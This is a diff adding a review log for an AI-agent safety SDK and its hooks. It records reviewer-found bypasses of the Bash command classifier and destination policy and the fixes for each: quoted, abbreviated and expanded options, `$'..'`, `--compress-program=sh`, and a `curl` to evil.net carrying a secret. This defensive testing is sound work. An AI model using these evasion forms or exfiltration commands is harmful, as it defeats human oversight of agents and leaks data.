@@ -309,3 +309,273 @@ was reported.
   `scripts/check-axe.mjs` over /guides/running-workflows/, /spec/ and
   /spec/1.2.0/ (12 runs, no violations). The built /spec/ and /spec/1.2.0/
   figures count 353 runtime fixtures, 347 of them expecting actions.
+
+## Round 1 — python-sdk, hooks-skills
+
+Twenty issues: 14 in python-sdk, 6 in hooks-skills. Issues 2 and 14 are
+one defect (the Bash destination bypass), recorded once; issues 13 and 12
+are one class of defect ("arguments the classifier does not recognise") in
+the SDK's reader and the plugin hook's. Nineteen were real and are fixed
+(issue 10 was a documentation gap only); one (issue 7) was already resolved
+on this branch. Each code fix has a test that fails on the code before it
+(checked by restoring the old file and running the test), named below.
+
+The items are by area; the reviewers' issue numbers are, item = issue: 1 =
+2 and 14, 2 = 4, 3 = 5, 4 = 6, 5 = 7, 6 = 8, 7 = 9, 8 = 10, 9 = 11, 10 =
+13, 11 = 15, 12 = 18, 13 = 20, 14 = 1, 15 = 3, 16 = 12, 17 = 16, 18 = 17,
+19 = 19.
+
+### python-sdk
+
+1. **The adapter's destination policy skipped Bash commands not classified
+   `send` (high; issue 14 is the same, medium).** Real, reproduced with the
+   reviewers' probes (`bash_dest2.py`, `dest_bash.py`, run against this
+   tree): under `allowed_destinations`, `curl 'https://evil.net/?q=secret'`,
+   `wget`, `gh issue comment`, `git push <url>`, a `curl -d` with a `$(...)`
+   and `python3 -c` were `mutate` or `execute` and went to a person, or ran
+   with `approval="off"`. Root cause: Bash's worst case was `mutate`, while
+   §5.18.3 makes "any request to another system whose effect the binding
+   does not know" `send` and applies the worst case to anything the
+   classifier does not recognise. Fix (`mapper.py`): `_worst_case()` is a
+   gated `mutate` and `send` (`execute` and `send` for an interpreter), used
+   for an empty or unreadable line, an always-dangerous pattern, an
+   expansion, an unrecognised command and an allow-listed command given an
+   argument it does not take as read-only; a change to a remote, registry or
+   cluster the command names (`git push`, `npm publish|unpublish`, `docker
+   push`, `kubectl delete|apply|patch|edit`) is `mutate` and `send`
+   (`_REMOTE_MUTATION_PATTERNS`); the local ones stay `mutate` (`rm`, `git
+   stash` forms, ...), so a destination policy refuses exactly the commands
+   that may transmit. The existing `_direct_destination_refusal` refuses them
+   ("Bash may send, and this layer cannot tell where: a command line names no
+   destination it reads"). Tests: `tests/test_adapter_effects.py`
+   `test_a_command_that_may_send_is_f504_under_a_policy` (nine commands,
+   approval `ask` and `off`; 14 failed before) and
+   `test_a_local_command_is_not_checked_against_the_policy`;
+   `tests/test_bash_classification.py` `test_the_worst_case_includes_send`.
+   Docs: the SDK guide's Bash table and Destination policies, SECURITY.md
+   §2.2.9, CHANGELOG Upgrading (Bash bullet).
+2. **`IdempotencyLog` replay dropped `evidence_seen` (medium).** Real,
+   reproduced: `checkpoint -> send` under an attested `send` policy, the send
+   performed through `send_once`, the run restored and the send re-delivered:
+   the log replayed `{kind, value}` and the run failed F505 after the
+   transmission. Fix (`idempotency.py`): the `done` entry keeps the
+   response's `evidence_seen` when present and `_replay` returns it. Tests:
+   `tests/test_idempotency.py::test_evidence_seen_is_kept_and_replayed`
+   (file-backed, across a restart) and
+   `tests/test_runner_effects.py::test_a_redelivered_send_keeps_its_attestation`
+   (the reviewer's scenario end to end: completes, one transmission). The
+   guide's Sends bullet says the replay carries it.
+3. **`IdempotencyLog` passed a delegation that names `replaces` straight to
+   the effect (low).** Real, reproduced with
+   `delegate_replaces_new_key.json`: after a restore the replacing attempt
+   (`run-1:3`, `replaces: t1`) was performed twice. The executor already
+   gives a replacing attempt its own key (`machine.rs`, `cur.replaces.is_some()`),
+   so the exception bought nothing. Fix: the clause is gone from
+   `idempotency.py` and from §4.4.2, which now says the rule applies to such
+   a delegation too ("its key is its own, so the rule keeps a re-delivery of
+   it from delegating twice and never answers it with the delegation it
+   replaces"); RFC-0009 never carried the sentence. Test:
+   `tests/test_idempotency.py::test_a_replacing_delegation_is_performed_once_per_key`
+   (replays the fixture, snapshots, restores); it replaces
+   `test_replaces_and_unkeyed_pass_through`, whose `replaces` half asserted
+   the removed behaviour (the unkeyed half is
+   `test_an_unkeyed_action_passes_through`).
+4. **`performed_since` matched keys by the prefix `<run_id>:` (low).**
+   Real, reproduced (`a:3` and `a:1:3` both listed for run `a`). Fix: match
+   `key.rpartition(":")[0] == run_id` (`<n>` is digits). Test:
+   `test_performed_since_does_not_list_a_run_whose_id_extends_this_one`.
+5. **`_core.Run.start` requires `header`, said not to be in the CHANGELOG
+   (high).** Not real on this branch: `CHANGELOG.md` [Unreleased] Upgrading,
+   "Reference executor, starting a run (Standard 1.2.0 §11.5)", says
+   "`_core.Run.start` takes a required keyword-only `header`, the version
+   the catalog's `# Standard version:` header declares or `None` for a
+   catalog without one; a call without it raises `TypeError`" (added in
+   59bef73). The reviewer's `grep -n 'header='` misses it because the text
+   names the keyword, not `header=`. Nothing changed.
+6. **A gated call without `tool_use_id` is R407, not in Upgrading; the
+   demos showed the opposite of their comments (medium).** Real,
+   reproduced: `examples/grounded_agent_demo.py` printed R407 under "With
+   Checkpoint", `checkpoint_enforcement_demo.py` "with checkpoint: Write:
+   blocked" and R407 where its summary says F501. Fixes: (a) both the
+   permission callback and the PreToolUse hook report F501 first when no
+   valid checkpoint exists (`_unheld_call_refusal`), R407 otherwise; (b) the
+   demos pass a context naming each call (`SimpleNamespace(tool_use_id=...)`,
+   as `capability_skills_demo.py` does, so they run without the SDK too),
+   one id for the PreToolUse hook and the callback of one call, and use a
+   fresh checkpoint directory, so a rerun does not find the last run's
+   checkpoint under "Without Checkpoint"; the enforcement demo's phase 2
+   shows one allowed call and phase 3 that it used the checkpoint, as each
+   gated call needs its own; (c) Upgrading says the change. Tests:
+   `tests/test_examples_demos.py` runs the three demos twice in one
+   directory and checks what they print (failed before on two demos);
+   `tests/test_sdk_integration.py::test_context_without_tool_use_id_still_needs_a_checkpoint`
+   now pins F501 for the callback and the hook.
+7. **`WorkflowDefinition.agents` was inserted before `extra` (low).**
+   Real, reproduced. Fix: `agents` moved after `extra`, so positional
+   construction is as before; no Upgrading entry needed. Test:
+   `tests/test_workflow_engine.py::TestWorkflowDefinitionFromDict::test_positional_fields_keep_their_order`.
+8. **Reservation 0 refused, Upgrading said only "at most the expiry"
+   (low).** Real as a documentation gap: refusing 0 is intended (a hold that
+   lapses at once holds nothing). Upgrading now says both
+   `checkpoint_reservation_seconds` and
+   `CheckpointTracker(reservation_seconds=...)` must be more than 0, and that
+   0 raises `ValueError`.
+9. **`git rev-parse` and `git ls-files` became read-only without a note
+   (low).** Real. Upgrading's Bash bullet says so, with the other Bash
+   changes of this round.
+10. **SDK Bash classifier: `$'..'`, `$".."`, brace expansion, `sort
+    --compress-program`, abbreviated options (high).** Real, reproduced
+    (the reviewer's `obs.py` returned `{}` for `find d $'-delete'` and `sort
+    -S 1k --compress-program=sh`). Fixes (`mapper.py`): `_mask_quoted`
+    reads the line's quoting, and a `$` outside single quotes (any
+    parameter expansion, `$'..'` and `$".."` included) or a brace expansion
+    (`{a,b}`, `{1..3}`) gives the worst case; the same reading of the masked
+    line marks each simple command whose words hold an unquoted `*`, `?` or
+    `[`, which makes `find`, `sort`, `uniq`, `date`, `hostname`, `file`,
+    `git`, `less` and `more` not read-only; `sort`, `uniq`, `date`,
+    `hostname` and `file` are read-only only with listed options (getopt
+    rules: clusters, attached and separate arguments, `--`, and any prefix
+    of a long option; a prefix of a writing option writes) and operands
+    (`date` only `+FORMAT`, `hostname` none, `uniq` one); `git`'s `--output`
+    check takes any abbreviation (`--outp`), and `less -o/-O/--log-file`
+    writes. Tests: `tests/test_bash_classification.py`
+    `test_arguments_the_classifier_does_not_take_as_read_only` (30
+    commands) and `test_read_only_arguments_stay_read_only` (16); 39 tests
+    of the file failed on the old mapper. `test_other_forms_are_gated_mutations`
+    keeps its `git stash` forms (`mutate` alone) and the three forms the
+    classifier does not recognise moved to
+    `test_unrecognised_forms_get_the_worst_case` (`mutate` and `send`).
+11. **Redactor: structured headers, camelCase names, member names (Python
+    and TypeScript, medium).** Real, reproduced in both. Fix
+    (`redaction.py`, `redact.ts`, identically): a string member whose name
+    ends in a credential name after any prefix (`accessToken`,
+    `dbPassword`), or in `authorization` or `cookie` (`Authorization`,
+    `Proxy-Authorization`, `Cookie`, `Set-Cookie`), is redacted whole; a
+    member name is redacted as text, and a name that would repeat one in
+    its object gets ` (2)`, ` (3)`, ... so no member is lost, with the
+    pointer of the new name. Five vectors in
+    `tests/conformance/secrets/redact.json` (`structured_headers`,
+    `camel_case_members`, `secret_member_name`,
+    `credential_shaped_member_name`, `colliding_member_names`), run by
+    `tests/test_redaction.py` and `packages/acs-core/test/redact.test.ts`
+    (all five failed on both old redactors), and the end-to-end
+    `tests/test_tool_call_approval.py::TestEvidenceToolInput::test_structured_credentials_in_the_input_are_redacted`
+    (`create_evidence_collector(..., include_tool_input=True)`; the export
+    held the Basic credential before). Both module comments state the rule.
+12. **SDK doc and docstring: grounding and minimum confidence "only for
+    `create_grounded_mcp_server` tools" (low).** Real. The SDK guide's
+    profile paragraph and `GroundedAgentConfig.grounding`'s docstring now
+    say every MCP tool bound to a capability (a served tool checks its own
+    result, the PostToolUse hook another server's); the `profiles`
+    docstring already said so.
+13. **PostToolUse failed open when using the call's hold raised (medium).**
+    Real, reproduced with `failopen.py`: with `_persist_state` raising
+    ENOSPC after PreToolUse, a result breaking the `mutate` contract was
+    passed on with no diagnostic. Fix (`adapter.py`): the hold is used in a
+    `try` of its own (logged at ERROR; the result is still checked), and the
+    outer handler replaces the result of an MCP tool the hook checks, or
+    whose mapping it cannot read (`_may_check_host_result`), with R407
+    (`_fail_call`, else the plain text form) instead of returning `{}`.
+    Tests: `TestOtherServersOutputs::test_the_result_is_checked_when_its_hold_cannot_be_used`
+    (the helper `_call` gains `after_pre` to break the store between the
+    hooks) and `test_a_recorder_that_fails_replaces_the_result`; both failed
+    before. The SDK guide's PostToolUse line and the hook's docstring say it.
+
+### hooks-skills
+
+14. **Skills' PostToolUse loggers wrote free-form lines and dropped
+    failures silently (low).** Real, reproduced (`.audit` a regular file:
+    exit 0, nothing logged). §6.4 requires a host's log in action-record or
+    event form and a failed capture reported. Fix: the six skills' loggers
+    (audit, checkpoint, persist, rollback, send, transform) are removed: the
+    plugin's `posttooluse_log_tool.sh`, registered for every tool, already
+    logs each call as an HMAC-chained action record and reports a line it
+    cannot write (exit 1 with the reason). The texts that called `.audit/`
+    "the audit logs" (checkpoint and rollback skills, the guide,
+    `snapshots.py`) now name `.claude/` (the plugin's audit log) and
+    `.audit/` (where earlier releases' skills logged, still protected from
+    checkpoints); the audit skill's live context reads `.claude/audit.log`.
+    SECURITY.md §5.4 drops the six logging rows and names the log hook's
+    §6.4 behaviour. Tests (`tests/test_skill_hooks.py`) replace the logger
+    tests, which tested the removed lines: `test_no_skill_keeps_a_log_of_its_own`
+    (six; failed before), `test_the_plugin_log_records_a_digest_and_not_the_input`
+    (the same four tool inputs, now through the plugin's hook) and
+    `test_a_log_that_cannot_be_written_is_reported`. Upgrading says the
+    `.audit/*-operations.log` files are no longer written.
+15. **SECURITY.md counted three blocking skill hooks (low).** Real: four
+    (audit, persist, rollback, send). The sentence names them, and says what
+    the log hook does without `jq` now that the skills' loggers are gone.
+16. **PreToolUse hook: quoted, abbreviated and expanded options made a
+    writing command `observe` (high).** Real, reproduced in a scratch
+    repository: `git log ... "--output=.claude/settings.local.json"`, `git
+    diff --out''put=x`, `file '-C' -m f`, `file --compi -m m` all exited 0.
+    Fix (`pretooluse_require_checkpoint.sh`): `split_words` splits and
+    dequotes the line as bash does (the line already refuses `$`, backticks
+    and `\`, so nothing in quotes expands); an unbalanced quote is `mutate`;
+    `long_option_of` takes any abbreviation (`git --output`; `file
+    --compile`, `--preserve-date`), `file -p` and `-C` in any cluster write,
+    and a `git` or `file` command with an unquoted glob character is
+    `mutate`. `posttooluse_take_checkpoint.sh` holds the same `split_words`
+    (a test keeps them equal), so both hooks read a `git stash create` line
+    alike. Tests (`tests/test_hook_lists_match_mapper.py`):
+    `test_a_quoted_abbreviated_or_expanded_option_is_gated_in_both` (eleven
+    commands, mapper and hook), `test_quoted_and_expanded_read_only_words_stay_read_only`
+    and `test_both_checkpoint_hooks_split_words_alike`; 12 failed on the old
+    hooks.
+17. **Rollback check scanned `used/` and `ended/` with one `jq` per file
+    (low).** Real (measured by the reviewer: 3.9 ms a file, a 60 s timeout
+    at about 15,600 files). Fix: `posttooluse_take_checkpoint.sh` enters
+    each commit it records in `.claude/checkpoints/commits/` (an empty file
+    named by the full commit id) before writing the marker; the pre-tool-use
+    hook and the rollback skill's command hook look up that one file (or
+    the live marker's `commit`), with no time that grows with the history.
+    A marker filed under `used/` or `ended/` without its entry no longer
+    makes a commit restorable (narrower, never wider). Tests:
+    `tests/test_hook_checkpoint_lifecycle.py::test_a_restore_looks_up_one_entry_not_the_history`
+    and `test_a_clean_tree_enters_no_commit`;
+    `tests/test_skill_hooks.py::TestRollbackCommandHook::test_a_filed_marker_without_its_entry_restores_nothing`.
+    The test helpers that planted a marker by hand now enter its commit as
+    the take hook does, and `test_an_expired_checkpoint_can_still_be_restored`
+    takes its checkpoint through the take hook. hooks/README, SECURITY.md,
+    CLAUDE.md and the hook comments say it.
+18. **The send skill's address hook missed loopback, link-local, IPv6 and
+    numeric forms (low).** Real, reproduced. Fix (`skills/send/SKILL.md`):
+    dotted IPv4 in 0/8, 127/8, 10/8, 172.16/12, 192.168/16 and 169.254/16;
+    IPv6 literals `[::...]`, `[0:...]`, `[fc..]`/`[fd..]` and
+    `[fe8..]`-`[feb..]`; and, as a URL's host (after `://` or `@`), an IPv4
+    address with one to three parts or a hex or octal part. A numeric
+    argument elsewhere (`--max-time 30`) and canonical public addresses
+    pass. Tests: `TestSendCommandHook` gains 15 blocked and 5 allowed
+    commands; SECURITY.md §5.4's row lists what is matched (host names stay
+    the stated gap).
+19. **README's hooks table out of date; hooks/README said the Stop hook
+    removes the marker (low).** Real. README.md's table lists the four hooks
+    by event and calls the log hook the plugin's action-record log, not an
+    `audit` step; hooks/README's Relationship table says the Stop hook files
+    the marker under `ended/`.
+
+### Checks after round 1 (python-sdk, hooks-skills)
+
+- Python: ruff check and format (CI's lists); mypy; every
+  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
+  every domain catalog and example `--strict`; the generators `--check`
+  (`sync_skill_schemas` 107, `gen_runtime_fixtures` 353,
+  `gen_call_fixtures` 30, `gen_trigger_vectors`,
+  `gen_standard_agents_binding`, `gen_capability_json_schemas`);
+  `scripts/run_conformance.py`; `pytest tests/` (4498 passed, 18 skipped);
+  `pytest benchmarks/tests/` (69). The reviewers' probes rerun against
+  this tree: every Bash command of `bash_dest.py`, `bash_dest2.py` and
+  `dest_bash.py` is F504 under the policy; `obs.py`'s `find` and `sort`
+  commands are F501 in both modes; `failopen.py` replaces the result with
+  R402 when the store fails; the three demos print what they say.
+- Rust (`core/`, 1.99.1): `cargo test --locked` (no Rust source changed).
+- TypeScript: `packages/acs-core` build, check, test (1816: the five new
+  redaction vectors); the binding check and test (191, 2 skipped).
+- Site: `npm run check`, `npm test` (1172), `npm run build` (check-dist),
+  `scripts/check-runs.mjs` (0 enforced runs over 1800px: the SDK guide's
+  Bash section was tightened after the first build measured 1856px; now
+  1772px), and `scripts/check-axe.mjs` over the 14 pages this round
+  changed (/guides/hooks/, /start/overview/, /spec/security/,
+  /guides/running-workflows/, /guides/claude-agent-sdk/,
+  /community/release-notes/, /spec/1.2.0/ and the six capability pages
+  whose skills changed): no violations, no sideways scroll.
